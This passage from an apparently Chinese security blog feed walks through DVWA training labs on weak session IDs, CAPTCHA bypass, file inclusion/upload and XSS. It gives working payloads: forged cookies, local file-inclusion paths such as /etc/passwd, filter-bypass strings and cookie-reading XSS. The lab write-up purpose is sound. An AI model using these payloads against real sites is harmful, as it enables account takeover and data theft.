    <content type="html"><![CDATA[<p>用户访问服务器的时候，在服务器端会创建一个会话(Session)，会话中会保存用户的状态和相关信息，用于标识用户。服务器端认证时，浏览器需要把当前用户持有的SessionID告知服务器。用户拿到session id就会加密后保存到 cookies 上，之后只要cookies随着http请求发送服务器，服务器就能识别用户。因此攻击者可以通过窃取用户SessionID，使用该SessionID登录进目标账户。</p><h1>low</h1><p>点击<code>Generate</code>，<code>Burpsuite</code>抓包，每<code>go</code>一次，响应中dvwasession就加一</p><p><img src="/2021/02/01/dvwa8/1.jpg" alt="1"></p><p>构造payload:<code>Cookie: dvwaSession=3; PHPSESSID=e34amjsmbj3phlmuk0u17vd1p3; security=low</code></p><p>即可在无密码情况下登录到页面</p><img src="/2021/02/01/dvwa8/2.jpg" alt="2" style="zoom: 33%;"><h1>medium</h1><img src="/2021/02/01/dvwa8/3.jpg" alt="3" style="zoom:50%;"><p>执行几次发现dvwasession的变化与时间戳一致，在<a href="https://tool.lu/timestamp/">转换工具</a>进行转换可知</p><p>构造<code>Cookie: dvwaSession=1612194327; PHPSESSID=e34amjsmbj3phlmuk0u17vd1p3; security=medium</code>登录即可</p><h1>high</h1><p>使用了PHP setcookie()函数进行设置:</p><p>格式：</p><pre><code class="hljs pgsql">setcookie(<span class="hljs-type">name</span>,<span class="hljs-keyword">value</span>,expire,<span class="hljs-type">path</span>,<span class="hljs-keyword">domain</span>,secure,httponly)</code></pre><pre><code class="hljs properties"> <span class="hljs-meta">参数</span>              <span class="hljs-string">描述</span><span class="hljs-attr">name</span>     <span class="hljs-string">必需。规定cookie的名称。</span><span class="hljs-attr">value</span>     <span class="hljs-string">必需。规定cookie的值。</span><span class="hljs-attr">expire</span>   <span class="hljs-string">可选。规定cookie的有效期。</span><span class="hljs-attr">path</span>     <span class="hljs-string">可选。规定cookie的服务器路径。</span><span class="hljs-attr">domain</span>     <span class="hljs-string">可选。规定cookie的域名。</span><span class="hljs-attr">secure</span>     <span class="hljs-string">可选。规定是否通过安全的HTTPS连接来传输cookie。</span><span class="hljs-attr">httponly</span> <span class="hljs-string">可选。规定是否Cookie仅可通过HTTP协议访问。</span></code></pre><p><img src="/2021/02/01/dvwa8/4.jpg" alt="4"></p><p>抓包后，将value值进行逆操作，再解密构造payload即可。</p><h1>impossible</h1><p><img src="/2021/02/01/dvwa8/5.jpg" alt="5"></p><p>SHA-1是一种数据加密算法，该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。</p><p>PS：现实中应该没有这么简单的漏洞存在，这处理方法有点草率</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Insecure CAPTCHA</title>
    <link href="/2021/02/01/dvwa7/"/>
    <url>/2021/02/01/dvwa7/</url>
    
    <content type="html"><![CDATA[<p>Insecure CAPTCHA，不安全的验证码，CAPTCHA全称：Completely Automated Public Turing Test to Tell Computers and Humans Apart。验证码流程一般是:用户向浏览器的服务器发送请求，浏览器的服务器返回验证码给用户，用户将验证码发送给网站服务器，网站服务器会向浏览器的服务器验证这个验证码的正确性，浏览器最终返回验证结果给网站服务器。</p><p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">recaptcha_check_answer</span><span class="hljs-params">(<span class="hljs-variable">$privkey</span>,<span class="hljs-variable">$remoteip</span>, <span class="hljs-variable">$challenge</span>,<span class="hljs-variable">$response</span>)</span></span></code></pre><p>参数$privkey是服务器申请的private key ，$remoteip是用户的ip，$challenge 是recaptcha_challenge_field 字段的值，来自前端页面 ，$response是 recaptcha_response_field 字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：</p><blockquote><p>$is_valid是布尔型的，表示校验是否有效，</p><p>$error是返回的错误代码。</p></blockquote><p>我们的绕过简而言之就是当验证不合格时，通过burp抓包工具修改成符合要求的数据包。修改参数标志位、USER-AGENT之类的参数。</p><h1>low</h1><img src="/2021/02/01/dvwa7/1.jpg" alt="1" style="zoom:67%;"><p>源码中第一步检查验证码返回表单，第二步接受用户的表单再来进行修改。服务器仅仅通过检查Change，step参数来判断用户是否已经输入了正确的验证码。故我们抓包将step值修改为2即可绕过验证。也可以用CSRF攻击实现。</p><p><img src="/2021/02/01/dvwa7/2.jpg" alt="2"></p><h1>medium</h1><p><img src="/2021/02/01/dvwa7/3.jpg" alt="3"></p><p>本质上与low无区别，抓包时多修改一个<code>passed_captcha</code>值即可</p><h1>high</h1><p><img src="/2021/02/01/dvwa7/4.jpg" alt="4"></p><p>$resp参数有浏览器返回，我们只能改参数<code>recaptcha_response_field、User-Agent</code></p><p><img src="/2021/02/01/dvwa7/5.jpg" alt="5"></p><h1>impossible</h1><p><img src="/2021/02/01/dvwa7/6.jpg" alt="6"></p><p>对返回值单独验证，并且本关要输入当前密码，<code>Anti-CSRF token ,PDO</code>也在。</p><p>参考：<a href="https://www.freebuf.com/articles/web/119692.html">InsecureCAPTCHA</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||File Inclusion&amp;File Upload</title>
    <link href="/2021/01/27/dvwa5/"/>
    <url>/2021/01/27/dvwa5/</url>
    
    <content type="html"><![CDATA[<h1>File Inclusion</h1><h2 id="文件包含与漏洞"><a class="header-anchor" href="#文件包含与漏洞">🍭</a>文件包含与漏洞</h2><p>开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。</p><p>文件包含函数的参数没有经过过滤或者严格的定义，并且参数可以被用户控制，这样就可能包含非预期的文件。如果文件中存在恶惹代码，无论文件是什么类型，文件内的恶意代码都会被解析并执行。<br>文件包含漏洞可能会造成服务器的网页被篡改、网站被挂马、服务器被远程控制，被安装后门等危害。</p><h2 id="文件包含常用函数"><a class="header-anchor" href="#文件包含常用函数">🍭</a>文件包含常用函数</h2><ul><li>include。包含并运行指定文件，include在出错时产生警告(E_WARNING)，脚本会继续运行。</li><li>include_once。在脚本执行期间包含并运行指定文件。该函数和include函数类似，但使用该函数时，PHP会检查指定文件是否已经被包含过，如果是，则不会再次包含。</li><li>require。包含并运行指定文件。require在出错时产生E_COMPILE_ERROR级别的错误，导致脚本中止运行。</li><li>require_once。它和require函数类似，但使用该函数时，PHP会检查指定文件是否已经被包含过，如果是，则不会再次包含。</li></ul><h2 id="本地文件包含"><a class="header-anchor" href="#本地文件包含">🍭</a>本地文件包含</h2><h3 id="无限制本地文件包含"><a class="header-anchor" href="#无限制本地文件包含">🍭</a>无限制本地文件包含</h3><p>代码中没有为包含文件指定特定的前缀或者.php、html等扩展名，因此攻击者可以利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，或者执行其他文件中的代码。</p><h3 id="有限制本地文件包含"><a class="header-anchor" href="#有限制本地文件包含">🍭</a>有限制本地文件包含</h3><p>代码中为包含文件指定了特定的前缀或者.php、.html等扩展名，攻击者需要绕过前缀或者扩展名过滤，才能利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息。常见的有限制本地文件包含过滤绕过的方式主要有%00截断文件包含、路径长度截断文件包含、点号截断文件包含这3种。</p><h3 id="常见的敏感信息路径"><a class="header-anchor" href="#常见的敏感信息路径">🍭</a>常见的敏感信息路径</h3><p>利用本地文件包含漏洞可以获取系统本地的其他文件的内容。<br>Windows系统常见敏感文件如下：</p><pre><code class="hljs latex">c:<span class="hljs-tag">\<span class="hljs-name">boot</span></span>.ini系统版本信息c:<span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">php</span></span>.ini PHP配置信息。c:<span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">my</span></span>.ini MySQL配置信息。c: <span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">httpd</span></span>.conf Apache配置信息。</code></pre><p>linux:</p><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>passwd Linux系统账号信息。<span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf Apache配置信息。<span class="hljs-regexp">/etc/my</span>.conf MySQL配置信息。<span class="hljs-regexp">/usr/</span>etc/php.ini PHP配置信息。</code></pre><h2 id="远程文件包含"><a class="header-anchor" href="#远程文件包含">🍭</a>远程文件包含</h2><h3 id="无限制远程文件包含"><a class="header-anchor" href="#无限制远程文件包含">🍭</a>无限制远程文件包含</h3><p>无限制远程文件包含是指包含文件的位置并不是本地服务器，而是通过URL.的形式包含其他服务器上的文件，执行文件中的恶意代码<br>漏洞利用条件为<code>allow_url_fopen=on和 allow_url_include=on</code></p><h3 id="有限制远程文件包含"><a class="header-anchor" href="#有限制远程文件包含">🍭</a>有限制远程文件包含</h3><p>有限制远程文件包含是指当代码中存在特定的前缀或者，php，htrul等扩展名过滤时，攻击者需要绕过前缀或者扩展名过滤，才能执行远程URL中的恶意代码。</p><h2 id="low"><a class="header-anchor" href="#low">🍭</a>low</h2><p>页面中有3个文件，分别点击url中pag的参数值改变。</p><h3 id="本地文件包含-v2"><a class="header-anchor" href="#本地文件包含-v2">🍭</a>本地文件包含</h3><p>先在可控参数值位置输入一个不存在的文件进行访问</p><p><img src="/2021/01/27/dvwa5/1.jpg" alt="1"></p><p>报错信息中含绝对路径，网站根目录为\dvwa\ ，include.php到网站根目录共隔了两个文件夹，我们可以返回到根目录去访问一些敏感信息，比如PHP版本信息</p><p><img src="/2021/01/27/dvwa5/2.jpg" alt="2"></p><h3 id="远程文件包含-v2"><a class="header-anchor" href="#远程文件包含-v2">🍭</a>远程文件包含</h3><h4 id="包含本地服务器上的文件"><a class="header-anchor" href="#包含本地服务器上的文件">🍭</a>包含本地服务器上的文件</h4><p>在本地根目录创建一个文件，并访问如：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;genius&quot;</span> ; <span class="hljs-meta">?&gt;</span></code></pre><p>命名为jpg格式（其它格式也可，在HTTP中若文件有包含PHP代码，代码都会被执行)</p><img src="/2021/01/27/dvwa5/3.jpg" alt="3" style="zoom:67%;"><p>genius改成其它恶意代码</p><h4 id="包含远程服务器上的文件"><a class="header-anchor" href="#包含远程服务器上的文件">🍭</a>包含远程服务器上的文件</h4><p>可以包含Linux里的文件，远程连接（不展示辽)</p><h2 id="medium"><a class="header-anchor" href="#medium">🍭</a>medium</h2><pre><code class="hljs lasso"><span class="hljs-comment">// Input validation</span>$file = str_replace( <span class="hljs-built_in">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, $file );$file = str_replace( <span class="hljs-built_in">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, $file );</code></pre><p>源码中将输入的url参数中包含的<code>http://</code>，<code>https:// </code>，<code>. . /</code> ，<code>. . \</code>替换成空字符。只过滤了远程文件包含。</p><h3 id="本地包含"><a class="header-anchor" href="#本地包含">🍭</a>本地包含</h3><p>与low一样</p><h3 id="远程包含"><a class="header-anchor" href="#远程包含">🍭</a>远程包含</h3><p>构造:<code>httphttp://://127.0.0.1/1.jpg</code></p><p><img src="/2021/01/27/dvwa5/4.jpg" alt="4"></p><h2 id="high"><a class="header-anchor" href="#high">🍭</a>high</h2><pre><code class="hljs gams"><span class="hljs-comment">// Input validation</span><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> ) &amp;&amp; <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;    <span class="hljs-comment">// This isn&#x27;t the page we want!</span>    echo <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;    exit;</code></pre><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。</p><p>语法</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fnmatch</span><span class="hljs-params">(pattern,string,flags)</span></span></code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>pattern</td><td>必需。规定要检索的模式。</td></tr><tr><td>string</td><td>必需。规定要检查的字符串或文件。</td></tr><tr><td>flags</td><td>可选。</td></tr></tbody></table><p>本关用fnmatch（）检查file。介绍一个小知识:</p><p><strong>PHP 伪协议</strong></p><p>PHP带有很多内置URL.风格的封装协议，可用于<code>fopen，copy,file_exists和filesize</code>等文件系统函数。除了这些内置封装协议，还能通过stream_wrapper_register注册自题义的封装协议。这些协议都被称为伪协议。<br>常见的PHP伪协议如下：</p><pre><code class="hljs awk">file：<span class="hljs-regexp">//</span> 访问本地文件系统http:<span class="hljs-regexp">//</span> 访问HTTP(S)网址ftp:<span class="hljs-regexp">//</span> 访问FTP(S) URLphp：<span class="hljs-regexp">//</span> 访问各个输入输出流zlib：<span class="hljs-regexp">//</span> 处理压缩流data:<span class="hljs-regexp">//</span> 读取数据glob：<span class="hljs-regexp">//</span> 查找匹配的文件路径模式phar:<span class="hljs-regexp">//</span> PHP归档ssh2:<span class="hljs-regexp">//</span> Secure Shell <span class="hljs-number">2</span>rar：<span class="hljs-regexp">//</span> RAR数据压缩ogg：<span class="hljs-regexp">//</span> 处理音频流expect：<span class="hljs-regexp">//</span> 处理交互式的流</code></pre><p>本关构造：<code>file://D:/phpstudy_pro/WWW/1.jpg</code>即可~</p><h2 id="impossible"><a class="header-anchor" href="#impossible">🍭</a>impossible</h2><p><img src="/2021/01/27/dvwa5/5.jpg" alt="5"></p><h1>File Upload</h1><p>在upload-labs里详细介绍过了，这里简单讲一下</p><h2 id="low-v2"><a class="header-anchor" href="#low-v2">🍭</a>low</h2><p>basename() 函数返回路径中的文件名部分</p><p>语法</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">basename</span><span class="hljs-params">(path,suffix)</span></span></code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要检查的路径。</td></tr><tr><td>suffix</td><td>可选。规定文件扩展名。如果文件有 suffix，则不会输出这个扩展名</td></tr></tbody></table><p>没什么过滤，不赘述</p><h2 id="medium-v2"><a class="header-anchor" href="#medium-v2">🍭</a>medium</h2><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> )</span></span> &amp;&amp;    ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) )</code></pre><p>限制文件大小和类型，抓包修改或者00截断（<strong>注意PHP版本</strong>）都可以</p><h2 id="high-v2"><a class="header-anchor" href="#high-v2">🍭</a>high</h2><p>多了一句：</p><pre><code class="hljs perl">$uploaded_ext  = <span class="hljs-keyword">substr</span>( $uploaded_name, strrpos( $uploaded_name, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);</code></pre><p>出现的函数upload-labs都讲过了，本关白名单，构造图片马，00截断都可</p><h2 id="impossible-v2"><a class="header-anchor" href="#impossible-v2">🍭</a>impossible</h2><p><img src="/2021/01/27/dvwa5/6.jpg" alt="6"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||XSS(Reflected&amp;Stored&amp;DOM)</title>
    <link href="/2021/01/27/3/"/>
    <url>/2021/01/27/3/</url>
    
    <content type="html"><![CDATA[<h1>XSS原理</h1><p>XSS是跨站脚本攻击(Cross Site Scripting)恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS的实质其实是HTML代码与Javscript代码的注入。但由于XSS的攻击对象是与客户对等的Browser端，因此常常不被开发者所重视。但xss漏洞危害很大，一旦被攻击成功，私密网页，会话，cookie(许多网页在登录后服务端会返回一个cookie值给用户端，这样用户就不用多次输入密码进行登录，但cookie如果被窃取，攻击者就可以肆意登录用户的账号，<strong>http-only可确保cookie不被盗用</strong>)等内容都会被窃取，还可能导致流量被劫持实现恶意跳转（比如在网页中插入一段<code>&lt;script&gt;window.location.href=&quot;任意网址&quot;;&lt;/script&gt;</code>就可以跳转到别的网址）。</p><p>举个栗子:</p><p>随便写个网页</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">&quot;PowderBlue&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>查询<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xss_input&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$xss = $_GET[<span class="hljs-string">&#x27;xss_input&#x27;</span>];</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;输入值:&lt;br&gt;&#x27;</span>.$xss;</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><p>效果：</p><img src="/2021/01/27/3/2.jpg" alt="2" style="zoom:67%;"><p>有点简陋(html了解不多)，随便输入一下页面会正常回显</p><p><img src="/2021/01/27/3/3.jpg" alt="3"></p><p>查看页面源码</p><p><img src="/2021/01/27/3/4.jpg" alt="4"></p><p>原封不动输入了，我们换个值输入:<code>&lt;script&gt;alert('genius')&lt;/script&gt;</code></p><img src="/2021/01/27/3/5.jpg" alt="5" style="zoom:67%;"><p>这次不像第一次那样，而是执行了输入的代码，弹出一个框，这就存在xss漏洞。但并不是只有script标签才可以插入代码，HTML中还有<code>onerror,oneclick,onmouseover,Onload……</code>多种方式，格式如下：</p><pre><code class="hljs awk">onerror<span class="hljs-regexp">/oneclick/</span>onmouseover/Onload=“执行内容”</code></pre><p>其次还可插在<code>&lt;img&gt;,&lt;textarea&gt;……</code>标签里。</p><p>根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS，DOM型的XSS由于其特殊性，常常被分为第三种。</p><h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS">🍭</a>反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。<br>攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。常出现于钓鱼网站，邮箱等。</p><h2 id="low"><a class="header-anchor" href="#low">🍭</a>low</h2><p>源码中有一个新函数：<code>array_key_exists() </code>:函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。</p><p>本关并无过滤。测试一下：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><img src="/2021/01/27/3/6.jpg" alt="6" style="zoom: 80%;"><p>获取cookie:</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="/2021/01/27/3/7.jpg" alt="7"></p><p>输入：</p><img src="/2021/01/27/3/8.jpg" alt="8" style="zoom:80%;"><p>就成功辽~</p><h2 id="medium"><a class="header-anchor" href="#medium">🍭</a>medium</h2><p>源码用<code>str_replace</code>函数对<code>&lt;script&gt;</code>标签进行替换。</p><h3 id="嵌套绕过"><a class="header-anchor" href="#嵌套绕过">🍭</a>嵌套绕过</h3><p>构造：<code>&lt;scr&lt;script&gt;ipt&gt;alert(666)&lt;/script&gt;</code></p><img src="/2021/01/27/3/10.jpg" alt="10" style="zoom:50%;"><h3 id="大小写绕过"><a class="header-anchor" href="#大小写绕过">🍭</a>大小写绕过</h3><p><code>&lt;Script&gt;alert(/genius/)&lt;/script&gt;</code></p><img src="/2021/01/27/3/11.jpg" alt="11" style="zoom:80%;"><h3 id="使用别的标签来绕过"><a class="header-anchor" href="#使用别的标签来绕过">🍭</a>使用别的标签来绕过</h3><p><code>&lt;body onload=alert('genius')&gt;</code></p><p><code>&lt;a href='' onclick=alert('genius')&gt;click&lt;/a&gt;</code></p><h2 id="high"><a class="header-anchor" href="#high">🍭</a>high</h2><pre><code class="hljs autoit">$name = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[ <span class="hljs-string">&#x27;name&#x27;</span> ] )<span class="hljs-comment">;</span></code></pre><p>本关用了正则表达式，对<code>&lt;script&gt;</code>标签进行了严格的过滤，但没有过滤别的标签，此时可以通过img、body等标签的事件或者iframe(在一个HTML中嵌入另一个HTML)等标签的src注入恶意的js代码.</p><p><code>&lt;body onload=alert('jisso')&gt;</code></p><p><code>&lt;img src=&quot;&quot; onerror=alert('lisa')&gt;</code></p><p><code>&lt;a href='' onclick=alert('rose')&gt;click&lt;/a&gt;</code></p><p><code>Iframe:&lt;iframe onload=alert(gennie)&gt;</code></p><p><code>&lt;body onmousemove=alert('genius')&gt;</code></p><h2 id="impossible"><a class="header-anchor" href="#impossible">🍭</a>impossible</h2><p><code>Anti-CSRF token</code>它又出来了</p><p><code>htmlspecialchars()</code></p><p>把预定义的字符转换为 HTML 实体。预定义字符：</p><ul><li>&amp; （和号）成为 &amp;</li><li>&quot; （双引号）成为 &quot;</li><li>’ （单引号）成为 ’</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul><p>语法</p><pre><code class="hljs applescript">htmlspecialchars(<span class="hljs-built_in">string</span>,flags,<span class="hljs-built_in">character</span>-<span class="hljs-keyword">set</span>,double_encode)</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要转换的字符串。</td></tr><tr><td><em>flags</em></td><td>可选。规定如何处理引号、无效的编码以及使用哪种文档类型。                              可用的引号类型：                                                                                                                                                                           ENT_COMPAT - 默认。仅编码双引号。                                                                                    ENT_QUOTES - 编码双引号和单引号。                                                                                           ENT_NOQUOTES - 不编码任何引号。</td></tr><tr><td><em>character-set</em></td><td>可选。一个规定了要使用的字符集的字符串。</td></tr><tr><td><em>double_encode</em></td><td>可选。布尔值，规定了是否编码已存在的 HTML 实体。  TRUE - 默认。将对每个实体进行转换。 FALSE - 不会对已存在的 HTML 实体进行编码。</td></tr></tbody></table><p>详情：<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">htmlspecialchars（）</a></p><h1>存储型XSS</h1><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。</p><p>攻击方式：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><h2 id="low-v2"><a class="header-anchor" href="#low-v2">🍭</a>low</h2><p><img src="/2021/01/27/3/12.jpg" alt="12"></p><p>本关只防御了SQL注入漏洞，并没有防御xss漏洞。</p><p>测试一下：<code>&lt;script&gt;alert('lisa')&lt;/script&gt;</code></p><p>发现name框里最多只能输入10个字符。有以下几种办法可以进行攻击：</p><h3 id="message框编辑"><a class="header-anchor" href="#message框编辑">🍭</a>message框编辑</h3><p>name限制了但是message框没有字符限制，测试一下：</p><img src="/2021/01/27/3/13.jpg" alt="13" style="zoom:50%;"><p>message框可以攻击，这是一种思路；</p><h3 id="在name框编辑，抓包篡改"><a class="header-anchor" href="#在name框编辑，抓包篡改">🍭</a>在name框编辑，抓包篡改</h3><p>抓包后在name框编辑即可。</p><h3 id="在js前端修改参数"><a class="header-anchor" href="#在js前端修改参数">🍭</a>在js前端修改参数</h3><img src="/2021/01/27/3/15.jpg" alt="15" style="zoom:67%;"><p>将<code>maxlength</code>参数值改大即可。</p><h3 id="借助火狐的插件Tamper-Data"><a class="header-anchor" href="#借助火狐的插件Tamper-Data">🍭</a>借助火狐的插件Tamper Data</h3><img src="/2021/01/27/3/17.jpg" alt="17" style="zoom:50%;"><p>一样在message编写</p><img src="/2021/01/27/3/16.jpg" alt="16" style="zoom:50%;"><p>本与在message框编写无太大差异，但这个插件只要随意输入值，无需构造xss即可获取cookie值，且可篡改头文件等多个信息。</p><h2 id="medium-v2"><a class="header-anchor" href="#medium-v2">🍭</a>medium</h2><p><img src="/2021/01/27/3/18.jpg" alt="18"></p><p><code>addslashes() </code>函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（'）</li><li>双引号（&quot;）</li><li>反斜杠（\）</li><li>NULL</li></ul><p>只对<code>&lt;script&gt;</code>替换，与反射型xss的medium一样,<code>&lt;script&gt;</code>的嵌套大小写绕过，标签绕过(如下)，依旧用修改js前端，或者抓包的方法</p><p><code>&lt;body onload=alert('jisso')&gt;</code></p><p><code>&lt;img src=&quot;&quot; onerror=alert('lisa')&gt;</code></p><p><code>&lt;a href='' onclick=alert('rose')&gt;click&lt;/a&gt;</code></p><p><code>Iframe:&lt;iframe onload=alert(gennie)&gt;</code></p><p><code>&lt;body onmousemove=alert('genius')&gt;</code></p><h2 id="high-v2"><a class="header-anchor" href="#high-v2">🍭</a>high</h2><pre><code class="hljs stata"><span class="hljs-variable">$name</span> = preg_replace( &#x27;/&lt;(.*)<span class="hljs-built_in">s</span>(.*)c(.*)<span class="hljs-built_in">r</span>(.*)<span class="hljs-built_in">i</span>(.*)p(.*)t/i&#x27;, &#x27;&#x27;, <span class="hljs-variable">$name</span> );</code></pre><p>与上一关类似，对<code>&lt;script&gt;</code>处理不同，本关用正则表达式处理，故方法与上一关相同，<code>&lt;script&gt;</code>的嵌套和大小写绕过不可用。</p><h2 id="impossible-v2"><a class="header-anchor" href="#impossible-v2">🍭</a>impossible</h2><p><img src="/2021/01/27/3/19.jpg" alt="19"></p><h1>DOM XSS</h1><p>DOM全称Doument Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。<br>DOM型XSS其实是一种特殊的反射型XSS，它是基于DOM文档对象模型的一种漏洞。HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。HTMLDOM树结构如下</p><p><img src="/2021/01/27/3/20.jpg" alt="20"></p><p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Documentobject文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。<br>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，且包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p><h2 id="low-v3"><a class="header-anchor" href="#low-v3">🍭</a>low</h2><p>无任何处理，直接在url编写<code>&lt;script&gt;alert('lisa')&lt;/script&gt;</code></p><img src="/2021/01/27/3/21.jpg" alt="21" style="zoom:50%;"><h2 id="medium-v3"><a class="header-anchor" href="#medium-v3">🍭</a>medium</h2><p><img src="/2021/01/27/3/22.jpg" alt="22"></p><p>相当于将<code>&lt;script&gt;</code>过滤掉，其它标签还是可以使用的<code>&lt;img  src=1  οnerrοr=('hack')&gt;</code>，并没有弹框</p><img src="/2021/01/27/3/23.jpg" alt="23" 